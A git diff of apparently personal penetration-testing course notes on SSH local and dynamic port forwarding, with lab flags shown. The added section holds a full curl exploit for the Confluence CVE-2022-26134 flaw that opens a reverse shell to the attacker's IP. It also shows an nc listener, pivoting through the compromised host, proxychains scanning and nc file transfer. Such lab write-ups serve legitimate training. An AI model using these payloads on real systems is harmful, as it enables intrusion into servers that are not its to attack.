@@ -235,7 +235,7 @@ database_admin@pgdatabase01:~$ cat /tmp/socat_flag
 
 # SSH Tunneling
 
-## Local SSH Port Forwarding
+## Local
 
 2. Start VM Group 2. A server is running on HRSHARES port 4242. Download the **ssh_local_client** binary from **hxxp://CONFLUENCE01:8090/exercises/ssh_local_client**. Create an SSH local port forward on CONFLUENCE01, which will let you run the **ssh_local_client** from your Kali machine against the server on HRSHARES and retrieve the flag.
 
@@ -357,3 +357,121 @@ chmod +x ssh_local_client
 	Connecting to 192.168.233.63:4242
 	Flag: "OS{0ccdf0d584981c5fd0061c873fc7be2d}"
 ```
+
+## Dynamic
+
+1. Follow this walkthrough, and scan HRSHARES from the Kali machine using Nmap and Proxychains. What port between 4800 and 4900 is open?
+
+> Extremely similar to SSH Local Port Forwarding above
+
+- Start by exploiting Confluence Server with CVE-2022-26134 exploit and upgrade TTY
+```bash
+# Tab 1 - nc listener
+nc -nlvp 1270
+
+# Tab 2 - exploit
+curl -v http://192.168.233.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.154/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Tab 1 - CONFLUENCE01 revshell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+- Setup Dynamic Port Forward on CONFLUENCE01
+```bash
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.233.215
+	<$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.233.215   
+	Could not create directory '/home/confluence/.ssh'.
+	The authenticity of host '10.4.233.215 (10.4.233.215)' can''t be established.
+	ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	yes
+	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+	database_admin@10.4.233.215''s password:
+```
+
+- On Kali, edit config file of Proxychains
+```bash
+vim /etc/proxychains4
+	...
+		[ProxyList]
+	# add proxy here ...
+	# meanwile
+	# defaults set to "tor"
+	socks5 192.168.233.63 9999
+```
+
+- Run proxychains for nmap scan
+```bash
+proxychains nmap -p 4800-4900  -Pn 172.16.233.217                                                                                             
+	[proxychains] config file found: /etc/proxychains4.conf
+	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+	[proxychains] DLL init: proxychains-ng 4.17
+	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 18:30 EDT
+	...
+	[proxychains] Strict chain  ...  192.168.233.63:9999  ...  172.16.233.217:4872  ...  OK
+	...
+	Nmap scan report for 172.16.233.217
+	Host is up (0.20s latency).
+	
+	PORT     STATE SERVICE
+	4872/tcp open  unknown
+	...
+```
+
+
+
+2. Download the client binary **ssh_dynamic_client** from **hxxp://CONFLUENCE01:8090/exercises/ssh_dynamic_client**.
+   Using Proxychains, run it against the port you just found.
+
+Note: the source files used to build the **ssh_dynamic_client** binary can be downloaded from **/exercises/client_source.zip**.
+
+- Use nc to download file
+```bash
+# Tab in kali - listener
+nc -nlvp 4444 > ssh_dynamic_client
+
+# W/in CONFLUENCE01's revshell
+nc 192.168.45.154 4444 < ../confluence/exercises/ssh_dynamic_client
+``` 
+
+- Test binary for instructions & run
+```bash
+chmod +x ssh_dynamic_client
+
+proxychains ./ssh_dynamic_client 172.16.233.217 -p 4872
+	[proxychains] config file found: /etc/proxychains4.conf
+	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+	[proxychains] DLL init: proxychains-ng 4.17
+	error: Found argument '172.16.233.217' which wasn't expected, or isn't valid in this context
+	
+	USAGE:
+	    ssh_dynamic_client [OPTIONS]
+	
+	For more information try --help
+
+
+./ssh_dynamic_client --help
+	prat_server 0.1.0
+	
+	USAGE:
+	    ssh_dynamic_client [OPTIONS]
+	
+	OPTIONS:
+	    -h, --help                 Print help information
+	    -i, --ip-addr <IP_ADDR>    [default: 127.0.0.1]
+	    -p, --port <PORT>          [default: 4141]
+	    -V, --version              Print version information
+
+
+proxychains ./ssh_dynamic_client -i 172.16.233.217 -p 4872
+	[proxychains] config file found: /etc/proxychains4.conf
+	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+	[proxychains] DLL init: proxychains-ng 4.17
+	Connecting to 172.16.233.217:4872
+	[proxychains] Strict chain  ...  192.168.233.63:9999  ...  172.16.233.217:4872  ...  OK
+	Flag: "OS{82d1d7a815dc8b779b63906acfc57ebc}"
+```
+
+
+## Remote
+
